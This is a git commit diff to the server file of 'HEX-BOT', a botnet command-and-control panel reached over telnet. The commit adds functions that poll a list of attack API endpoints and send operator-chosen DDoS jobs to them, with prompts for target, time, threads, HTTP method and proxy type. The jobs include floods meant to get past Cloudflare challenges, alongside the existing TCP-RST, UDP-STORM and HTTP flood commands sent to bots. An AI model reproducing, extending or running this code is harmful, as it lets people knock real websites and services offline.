1629b1a76eba5500bc51e32c7fd77b6cba544bb5
HaxTermux <93824226+Hex1629@users.noreply.github.com>
2024-05-11 00:19:25 +0700

    Update main.py

--- server/main.py
+++ server/main.py
@@ -1,10 +1,50 @@
-import socket,random,string,base64,threading,time
+import socket,random,string,base64,threading,time,os,requests
 from Encryptor import AES_Encryption
-from clients.banner import create_banner,create_HELP,banner_meth
+from clients.banner import create_banner,create_HELP,banner_meth,same
+from bs4 import BeautifulSoup
+from urllib.parse import urlparse
+
 login = [['ROOT','ROOT'],['ADMIN','ADMIN'],['HEX','HEX']]
 
 def random_unique(length):
  return ''.join([random.choice(string.ascii_letters+string.digits+'_.-+=,:;|!@$%^&*()<>?/]}{[') for _ in range(length)])
+
+offline = 0
+online = 0
+
+def get_api():
+    with open(f"{os.getcwd()}\\server\\API.txt",'r') as f:
+        return f.read()
+
+def fast_check(a,mode=1,opt={"User-Agent":"Hex-Bots/API 2024.05.101 TEST"},junk=''):
+  if mode == 1:global offline,online
+  try:
+    r = requests.get(a,headers=opt,timeout=2)
+    soup = BeautifulSoup(r.content, 'html.parser')
+    title = soup.title.string
+    if mode == 1:
+      if r.status_code == 404 and title != 'Run this Repl to see the results here.':online += 1; print(a)
+      else:offline += 1
+    else:
+      l = a.replace("https://","").replace("http://","")
+      if r.status_code == 404 and title != 'Run this Repl to see the results here.':
+        junk.send(f'\x1b[38;5;76mSENDING ATTACK DONE \x1b[38;5;255m--> \x1b[38;5;81mapi://{random_unique(len(l))\x1b[0m\r\n'.encode())
+      else:
+        junk.send(f'\x1b[38;5;196mSENDING ATTACK FAILED \x1b[38;5;255m--> \x1b[38;5;197mapi://{random_unique(len(l))\x1b[0m\r\n'.encode())
+  except:
+    if mode == 1:offline += 1
+    else:
+      junk.send(f'\x1b[38;5;196mSENDING ATTACK FAILED \x1b[38;5;255m--> \x1b[38;5;197mapi://{random_unique(len(l))\x1b[0m\r\n'.encode())
+
+def check_api():
+   global offline,online
+   while True:
+    api = get_api().split('\n')
+    offline = 0; online = 0
+    time.sleep(0.1)
+    for a in api:
+      threading.Thread(target=fast_check,args=(a,1)).start()
+    time.sleep(5)
 
 bots = []
 
@@ -36,6 +76,7 @@ def handshake_botnet(s, ip):
     try:
         while True:
             data = s.recv(65536).decode().split(" ")
+            print(data)
             if data[0] == 'AES256':
                 if data[1] == 'CREATE':  # AES256 CREATE
                     s.sendall(f'{random_unique(32)}#{random_unique(16)}'.encode())
@@ -85,7 +126,7 @@ def handle_title(s,ip):
   try:
     while True:
       for a in ['\\','|','/','-']:
-       s.sendall(f'\33]0;[{a}] <{time.ctime()}> .:|:. BOTS={len(bots)} LOGIN={ip[0]} .:|:. WELCOME TO HEX-BOT\a'.encode())
+       s.sendall(f'\33]0;[{a}] <{time.ctime()}> .:|:. BOTS={len(bots)} API={online}/{offline} LOGIN={ip[0]} .:|:. WELCOME TO HEX-BOT\a'.encode())
        time.sleep(0.1)
   except:pass
 
@@ -122,8 +163,50 @@ def sent_packet(length,s):
     if len(bots) != 1:s.send(b'\r\n\r\n')
     else:s.send(b'\r\n')
 
+def input_socket(s,value):
+  try:
+    test = value.decode()
+  except:
+    value = value.encode()
+  s.send(value)
+  while True:
+    data = s.recv(65536).decode().strip()
+    if not data:
+      continue
+    break
+  return data
+
+def sender_api(s,list_meth,now):
+ headers = {}
+ methods = now
+ hostname = input_socket(s,"Target ?")
+ scheme = ''
+ ports = 80
+ proxy = ''
+ links = ''
+ if methods.upper() in list_meth:
+   parsed_url = urlparse(hostname)
+   hostname = parsed_url.hostname
+   scheme = parsed_url.scheme
+   links = parsed_url.path or '/'
+ if methods.upper() == 'BROWSER':
+   proxy = input_socket(s,"\x1b[38;5;196mType \x1b[38;5;76mNone \x1b[38;5;77mSOCKS5 \x1b[38;5;78mSOCKS4 \x1b[38;5;79mHTTP \x1b[38;5;80mHTTPS \x1b[38;5;255m?\x1b[0m")
+ elif methods.upper() in ['COOKIE', 'COOKIE2']:
+   s.send('URL CF __cf_chl_tk,__cf_chl_rt_tk,__cf_chl_f_tk,__cf_chl_captcha_tk__,__cf_chl_managed_tk__,__cf_chl_jschl_tk__'.encode())
+   proxy = input_socket(s,"Type OPT 0-6 ?")
+ if methods.upper() == 'HTTP-19':
+   ports = int(input_socket(s,"Ports ?"))
+ meth_http = input_socket(s,"HTTP-METHODS GET, POST and etc ?")
+ times = int(input_socket(s,"TIMES ?"))
+ th = int(input_socket(s,"THREAD ?"))
+ a = f'target={hostname}&time={times}&threads={th}&methods={methods}'
+ opt = {'X-Port':str(ports),'X-Methods':meth_http,'X-Protocols':scheme,'X-Links':links,'X-Browser':proxy}
+ for a2 in get_api().split('\n'):
+   threading.Thread(target=fast_check,args=(a2+a,2,opt,s)).start()
+
 def client_command(s,u):
   try:
+    list_meth = ['BROWSER','HANDSHAKE','AMP','MURD-OPT','RAPID-FAST','MURD','COOKIE2','COOKIE']
     time.sleep(1)
     s.send(b'\033[2J\033[H')
     for a in create_banner("main",[time.ctime(),str(len(bots)),u]):
@@ -135,6 +218,8 @@ def client_command(s,u):
       com = data.upper().split(' ')
       if not data:continue
       if com[0] in ['CLS','CLEAR']:s.send(b'\033[2J\033[H')
+      elif com[0] in list_meth:
+        sender_api(s,list_meth,com[0])
       elif com[0] in ['TCP-RST','TCP_RESET','TCP_RST','TCP-RESET','UDP-STORM','UDPSTORM','UDP_STORM','HTTP-19','HTTP','H19','HTTP_19','STOP','END-ATTACK','END_ATTACK','END-ATK','CLOSE-ATK','CLOSE-ATTACK']:
        if len(com) != 1:
          all_com = command(com,mode=0)
@@ -153,6 +238,14 @@ def client_command(s,u):
       elif com[0] in ['METH','METHODS','HUB','LIST']:
         for a in banner_meth:
          s.send((a+'\r\n').encode()); time.sleep(0.1)
+      elif com[0] in ['TOTAL','COUNT','MUCH','ONLINE','OFFLINE','OFF','ON']:
+        api = get_api().split('\n')
+        list_all = []
+        for a in api:
+          list_all.append([a,'SERVER'])
+        for a in bots:
+          list_all.append([a,'BOTNET'])
+        s.send(same(list_all).encode())
       elif com[0] == 'HELP':
         for a in create_HELP():
          s.send((a+'\r\n').encode()); time.sleep(0.1)
@@ -177,12 +270,7 @@ def handshake_client(s, ip):
       else:
         user = data; break
     if code != 1:
-      s.send(b"\x1b[38;5;76mP\x1b[38;5;77m\x1b[38;5;78ma\x1b[38;5;79ms\x1b[38;5;80ms\x1b[38;5;81mw\x1b[38;5;87mo\x1b[38;5;86mr\x1b[38;5;85md \x1b[38;5;255m$\x1b[0m")
-      while True:
-       data = s.recv(65536).decode().strip()
-       if not data:
-         continue
-       pwd = data; break
+      pwd = input_socket(s,b"\x1b[38;5;76mP\x1b[38;5;77m\x1b[38;5;78ma\x1b[38;5;79ms\x1b[38;5;80ms\x1b[38;5;81mw\x1b[38;5;87mo\x1b[38;5;86mr\x1b[38;5;85md \x1b[38;5;255m$\x1b[0m")
       c = 0
       for a in login:
         if user.upper() == a[0] and pwd.upper() == a[0]:
@@ -227,6 +315,7 @@ def client_server():
    threading.Thread(target=handshake_client,args=(socks,ip)).start()
 
 print(f"Connection with TELNET or RAW only ( PUTTY ) . . .")
+threading.Thread(target=check_api).start()
 threading.Thread(target=bots_test).start()
 threading.Thread(target=client_server).start()
 threading.Thread(target=botnet_server).start()
